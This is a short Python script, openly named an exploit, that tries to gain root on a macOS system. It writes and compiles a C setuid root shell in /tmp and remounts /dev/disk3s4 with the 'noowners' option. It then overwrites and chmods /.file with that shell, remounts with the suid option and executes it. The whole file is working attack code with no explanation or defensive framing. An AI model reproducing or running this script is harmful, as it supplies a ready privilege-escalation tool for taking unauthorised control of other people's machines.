import os

# Function to create setuid shell payload
def create_payload():
    payload_content = """
#include <stdio.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}
"""
    with open("/tmp/suidshell.c", "w") as f:
        f.write(payload_content)
    os.system("gcc /tmp/suidshell.c -o /tmp/suidshell && chmod +s /tmp/suidshell")

# Function to mount filesystem with "noowners" flag
def mount_filesystem():
    os.system("diskutil mount -mountOptions noowners /dev/disk3s4")

# Function to make .file writable
def modify_file_permissions():
    os.system("chmod 777 /.file")

# Function to copy setuid shell binary into .file
def copy_payload():
    os.system("cp /tmp/suidshell /.file")

# Function to set permissions and setuid bit for .file
def set_file_permissions():
    os.system("chmod +sx /.file")

# Function to remount filesystem in "owners" and "suid" mode
def remount_filesystem():
    os.system("diskutil mount -mountOptions owners,suid /dev/disk3s4")

# Function to execute setuid shell
def execute_payload():
    os.system("/.file")

# Main function to execute exploit
def exploit():
    try:
        # Step 1: Create setuid shell payload
        create_payload()
        
        # Step 2: Mount filesystem with "noowners" flag
        mount_filesystem()
        
        # Step 3: Make .file writable
        modify_file_permissions()
        
        # Step 4: Copy setuid shell binary into .file
        copy_payload()
        
        # Step 5: Set permissions and setuid bit for .file
        set_file_permissions()
        
        # Step 6: Remount filesystem in "owners" and "suid" mode
        remount_filesystem()
        
        # Step 7: Execute setuid shell
        execute_payload()
        
    except Exception as e:
        print(f"Error executing exploit: {e}")

# Execute exploit
exploit()
